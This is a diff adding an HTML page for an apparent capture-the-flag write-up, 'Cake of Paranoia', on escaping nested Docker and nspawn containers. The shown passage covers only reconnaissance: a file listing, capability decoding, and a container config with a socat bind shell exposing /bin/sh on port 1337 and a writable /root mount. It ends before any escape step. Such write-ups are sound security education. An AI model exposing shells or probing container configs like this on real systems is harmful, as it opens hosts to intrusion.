@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+
+    <title>Cake of Paranoia</title>
+    <meta name="description" content="">
+
+    <link rel="stylesheet" href="https://tsheinen.github.io/main.css">
+    
+    
+
+    <style>
+        
+        [data-theme="Dark"] {   
+            --background-color: #2D283E;
+            --background-alt-color: #36304B;
+            --highlight-color: #DEC1FF;
+            --highlight-color-alt: #ED254E;
+            --foreground-color: #D1D7E0;
+        }
+        
+        [data-theme="Light"] {   
+            --background-color: #E0F5CC;
+            --background-alt-color: #EAF8DD;
+            --highlight-color: #D8315B;
+            --highlight-color-alt: #0197F6;
+            --foreground-color: #3B413C;
+        }
+        
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.4.0/dist/confetti.browser.min.js"></script>
+    
+    
+</head>
+<body data-theme="dark">
+    <script defer>
+
+        function setTheme(theme) {
+            document.body.dataset['theme'] = theme;
+            localStorage.setItem('theme', theme);
+        }
+        window.addEventListener('storage', function(event){
+            if (event.storageArea === localStorage && event.key === "theme") {
+                setTheme(event.newValue);
+            }
+        }, false);
+        setTheme(localStorage.getItem('theme') || 'dark');
+        setTimeout(() => window.document.body.classList.add("transition"), 300);
+    </script>
+    <a class="skip-main" href="#main">Skip to content</a>
+    <div class="container">
+        <header> 
+            <h1 class="site-header">
+                <a href="https:&#x2F;&#x2F;tsheinen.github.io">Teddy Heinen</a>
+            </h1>
+            <nav>
+                
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;about&#x2F;">About</a>
+                
+                
+                <a  href="https:&#x2F;&#x2F;tsheinen.github.io&#x2F;tags&#x2F;">Tags</a>
+                
+<!--                 <div class="search-container">
+                    <input id="search" type="search" placeholder="🧐 Search!">
+
+                    <div class="search-results">
+                        <div class="search-results__items"></div>
+                    </div>
+                </div> -->
+                
+            </nav>
+        </header>
+        <main id="main" tabindex="-1">
+            
+
+
+<nav class="toc">
+  <ul>
+  
+  </ul>
+  <svg class="toc-marker" width="200" height="200" xmlns="http://www.w3.org/2000/svg">
+    <path stroke="#444" stroke-width="3" fill="transparent" stroke-dasharray="0, 0, 0, 1000" stroke-linecap="round" stroke-linejoin="round" transform="translate(-0.5, -0.5)" />
+  </svg>
+</nav>
+
+<article class="post">
+    <header>
+        <h1>Cake of Paranoia</h1>
+    </header>
+
+    <div class="content">
+        <pre style="background-color:#212733;color:#ccc9c2;"><code><span>A layer cake of paranoia. Please enjoy, and don&#39;t be afraid to take seconds.
+</span></code></pre>
+<p>I blooded the chal :) with a cheese strat way easier than intended
+<a href="https://storage.googleapis.com/potluckctf/challenge01-dist.tgz">challenge01-dist.tgz</a></p>
+<p>We're provided a rootfs and tcp connection info which gets us a shell.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>potluck-ctf-2023/cake-of-paranoia/rootfs 
+</span><span>❯ fd
+</span><span>
+</span><span>etc/systemd/nspawn/
+</span><span>etc/systemd/nspawn/ubuntu.nspawn
+</span><span>etc/systemd/system.control/systemd-nspawn@ubuntu.service.d/
+</span><span>etc/systemd/system.control/systemd-nspawn@ubuntu.service.d/50-DeviceAllow.conf
+</span><span>...
+</span><span>etc/systemd/system/multi-user.target.wants/machines.target
+</span><span>etc/systemd/system/machines.target.wants/
+</span><span>etc/systemd/system/machines.target.wants/systemd-nspawn@ubuntu.service
+</span><span>...
+</span><span>var/lib/machines/ubuntu/
+</span><span>usr/lib/libnss_mymachines.so.2
+</span><span>usr/share/man/man1/systemd-machine-id-setup.1.gz
+</span><span>var/lib/machines/ubuntu/opt/
+</span><span>var/lib/machines/ubuntu/opt/containerd/
+</span><span>var/lib/machines/ubuntu/opt/containerd/bin/
+</span><span>var/lib/machines/ubuntu/opt/containerd/lib/
+</span><span>var/lib/machines/ubuntu/bin
+</span><span>var/lib/machines/ubuntu/sys/
+</span><span>var/lib/machines/ubuntu/media/
+</span><span>var/lib/machines/ubuntu/lib
+</span><span>var/lib/machines/ubuntu/run/
+</span><span>var/lib/machines/ubuntu/boot/
+</span><span>...
+</span><span>var/lib/machines/ubuntu/var/lib/docker/
+</span><span>var/lib/machines/ubuntu/var/lib/docker/engine-id
+</span><span>var/lib/machines/ubuntu/var/lib/docker/runtimes/
+</span><span>var/lib/machines/ubuntu/var/lib/docker/network/
+</span><span>var/lib/machines/ubuntu/var/lib/docker/network/files/
+</span><span>var/lib/machines/ubuntu/var/lib/docker/network/files/local-kv.db
+</span><span>var/lib/machines/ubuntu/var/lib/docker/volumes/
+</span><span>var/lib/machines/ubuntu/var/lib/docker/volumes/metadata.db
+</span><span>var/lib/machines/ubuntu/var/lib/docker/volumes/backingFsBlockDev
+</span><span>var/lib/machines/ubuntu/var/lib/docker/containers/
+</span><span>var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/
+</span><span>var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221-json.log
+</span><span>var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/mounts/
+</span><span>var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/hosts
+</span><span>var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/hostconfig.json
+</span><span>var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/resolv.conf.hash
+</span><span>var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/resolv.conf
+</span><span>var/lib/machines/ubuntu/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/config.v2.json
+</span></code></pre>
+<p>Examining the rootfs and connecting to the shell the general structure of the challenge becomes clear.</p>
+<p>We connect into a shell inside a docker container. This docker container is running inside a systemd nspawn container.  This nspawn container is running inside an arch vm and the flag is present in /flag.txt inside the top level vm.</p>
+<pre data-lang="js" style="background-color:#212733;color:#ccc9c2;" class="language-js "><code class="language-js" data-lang="js"><span style="font-style:italic;color:#5c6773;">// runs every minute by cron
+</span><span style="color:#ffa759;">const </span><span>GLib </span><span style="color:#f29e74;">= </span><span>imports</span><span style="color:#f29e74;">.</span><span>gi</span><span style="color:#f29e74;">.</span><span>GLib</span><span style="color:#ccc9c2cc;">;
+</span><span>
+</span><span style="color:#ffa759;">if </span><span>(</span><span style="color:#f29e74;">!</span><span>GLib</span><span style="color:#f29e74;">.</span><span style="color:#ffd580;">access</span><span>(</span><span style="color:#bae67e;">&quot;/flag.txt&quot;</span><span style="color:#ccc9c2cc;">, </span><span style="color:#ffcc66;">0</span><span>)) {
+</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">console</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">log</span><span>(</span><span style="color:#bae67e;">&quot;yay, the flag&#39;s still there!&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>} </span><span style="color:#ffa759;">else </span><span>{
+</span><span>  </span><span style="font-style:italic;color:#5ccfe6;">console</span><span style="color:#f29e74;">.</span><span style="color:#f28779;">log</span><span>(</span><span style="color:#bae67e;">&quot;whoops, the flag&#39;s gone&quot;</span><span>)</span><span style="color:#ccc9c2cc;">;
+</span><span>}
+</span></code></pre>
+<p>We'll need to do two container escapes -- first from docker to nspawn and then from nspawn to the top level. I'll first examine the docker container for any security-relevant configuration.</p>
+<pre style="background-color:#212733;color:#ccc9c2;"><code><span>&gt; cat /proc/self/status | grep CapEff
+</span><span>CapEff: 00000000a80425fb
+</span><span>&gt; capsh --decode=00000000a80425fb
+</span><span>0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
+</span></code></pre>
+<p>Capabilities are more or less uninteresting -- default and nothing that can be leverage to break out. Looking inside the container config though shows something very suspicious -- that /root is mounted as a volume inside the container.</p>
+<pre data-lang="json" style="background-color:#212733;color:#ccc9c2;" class="language-json "><code class="language-json" data-lang="json"><span>{
+</span><span>  </span><span style="color:#bae67e;">&quot;StreamConfig&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{}</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;State&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{
+</span><span>    </span><span style="color:#bae67e;">&quot;Running&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">true</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Paused&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Restarting&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;OOMKilled&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;RemovalInProgress&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Dead&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Pid&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">466</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;ExitCode&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Error&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;StartedAt&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;2023-11-29T08:37:47.639966172Z&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;FinishedAt&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;0001-01-01T00:00:00Z&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Health&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null
+</span><span>  }</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;ID&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;Created&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;2023-11-29T08:37:46.082139124Z&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;Managed&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;Path&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;socat&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;Args&quot;</span><span style="color:#ccc9c2cc;">: </span><span>[
+</span><span>    </span><span style="color:#bae67e;">&quot;-d&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;-d&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;TCP-LISTEN:1337,reuseaddr,fork&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;EXEC:/bin/sh,stderr&quot;
+</span><span>  ]</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;Config&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{
+</span><span>    </span><span style="color:#bae67e;">&quot;Hostname&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;68be6028e3e4&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Domainname&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;User&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;AttachStdin&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;AttachStdout&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;AttachStderr&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;ExposedPorts&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{
+</span><span>      </span><span style="color:#bae67e;">&quot;1337/tcp&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{}
+</span><span>    }</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Tty&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;OpenStdin&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;StdinOnce&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Env&quot;</span><span style="color:#ccc9c2cc;">: </span><span>[
+</span><span>      </span><span style="color:#bae67e;">&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;
+</span><span>    ]</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Cmd&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Image&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;entrypoint&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Volumes&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;WorkingDir&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Entrypoint&quot;</span><span style="color:#ccc9c2cc;">: </span><span>[
+</span><span>      </span><span style="color:#bae67e;">&quot;socat&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>      </span><span style="color:#bae67e;">&quot;-d&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>      </span><span style="color:#bae67e;">&quot;-d&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>      </span><span style="color:#bae67e;">&quot;TCP-LISTEN:1337,reuseaddr,fork&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>      </span><span style="color:#bae67e;">&quot;EXEC:/bin/sh,stderr&quot;
+</span><span>    ]</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;OnBuild&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Labels&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{}
+</span><span>  }</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;Image&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;sha256:8adf4a1c6bc350ad16f843424110069b69e4423ef4d87daa39c38ab001659166&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;ImageManifest&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;NetworkSettings&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{
+</span><span>    </span><span style="color:#bae67e;">&quot;Bridge&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;SandboxID&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;e1a8b0eceb93d2ed34f0e5f0c5935963554cf35071a19b7dbb692c1e25540c7e&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;HairpinMode&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;LinkLocalIPv6Address&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;LinkLocalIPv6PrefixLen&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Networks&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{
+</span><span>      </span><span style="color:#bae67e;">&quot;bridge&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{
+</span><span>        </span><span style="color:#bae67e;">&quot;IPAMConfig&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;Links&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;Aliases&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;NetworkID&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;8a082b6e4f0e46624e5ca1cc014fc1a5a52f44d6b4ce65cc6a015b7391de87de&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;EndpointID&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;07628d86f5bf567d848707f7f1af75d72bf89059d19349ab71f21b6d0fdf25bc&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;Gateway&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;172.17.0.1&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;IPAddress&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;172.17.0.2&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;IPPrefixLen&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">16</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;IPv6Gateway&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;GlobalIPv6Address&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;GlobalIPv6PrefixLen&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;MacAddress&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;02:42:ac:11:00:02&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;DriverOpts&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;IPAMOperational&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false
+</span><span>      }
+</span><span>    }</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Service&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;Ports&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{
+</span><span>      </span><span style="color:#bae67e;">&quot;1337/tcp&quot;</span><span style="color:#ccc9c2cc;">: </span><span>[
+</span><span>        {
+</span><span>          </span><span style="color:#bae67e;">&quot;HostIp&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;0.0.0.0&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>          </span><span style="color:#bae67e;">&quot;HostPort&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;1337&quot;
+</span><span>        }</span><span style="color:#ccc9c2cc;">,
+</span><span>        {
+</span><span>          </span><span style="color:#bae67e;">&quot;HostIp&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;::&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>          </span><span style="color:#bae67e;">&quot;HostPort&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;1337&quot;
+</span><span>        }
+</span><span>      ]
+</span><span>    }</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;SandboxKey&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;/var/run/docker/netns/e1a8b0eceb93&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;SecondaryIPAddresses&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;SecondaryIPv6Addresses&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;IsAnonymousEndpoint&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">true</span><span style="color:#ccc9c2cc;">,
+</span><span>    </span><span style="color:#bae67e;">&quot;HasSwarmEndpoint&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false
+</span><span>  }</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;LogPath&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;/var/lib/docker/containers/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221/68be6028e3e4a7b4a2c5f65d6e9681881ae1abf08b664e0f83d64d5092f1e221-json.log&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;Name&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;/jovial_mcnulty&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;Driver&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;overlay2&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;OS&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;linux&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;RestartCount&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">0</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;HasBeenStartedBefore&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">true</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;HasBeenManuallyStopped&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;MountPoints&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{
+</span><span>    </span><span style="color:#bae67e;">&quot;/root&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{
+</span><span>      </span><span style="color:#bae67e;">&quot;Source&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;/root&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>      </span><span style="color:#bae67e;">&quot;Destination&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;/root&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>      </span><span style="color:#bae67e;">&quot;RW&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">true</span><span style="color:#ccc9c2cc;">,
+</span><span>      </span><span style="color:#bae67e;">&quot;Name&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>      </span><span style="color:#bae67e;">&quot;Driver&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>      </span><span style="color:#bae67e;">&quot;Type&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;bind&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>      </span><span style="color:#bae67e;">&quot;Propagation&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;rprivate&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>      </span><span style="color:#bae67e;">&quot;Spec&quot;</span><span style="color:#ccc9c2cc;">: </span><span>{
+</span><span>        </span><span style="color:#bae67e;">&quot;Type&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;bind&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;Source&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;/root&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>        </span><span style="color:#bae67e;">&quot;Target&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;/root&quot;
+</span><span>      }</span><span style="color:#ccc9c2cc;">,
+</span><span>      </span><span style="color:#bae67e;">&quot;SkipMountpointCreation&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">false
+</span><span>    }
+</span><span>  }</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;SecretReferences&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;ConfigReferences&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#ffcc66;">null</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;MountLabel&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;ProcessLabel&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
+</span><span>  </span><span style="color:#bae67e;">&quot;AppArmorProfile&quot;</span><span style="color:#ccc9c2cc;">: </span><span style="color:#bae67e;">&quot;&quot;</span><span style="color:#ccc9c2cc;">,
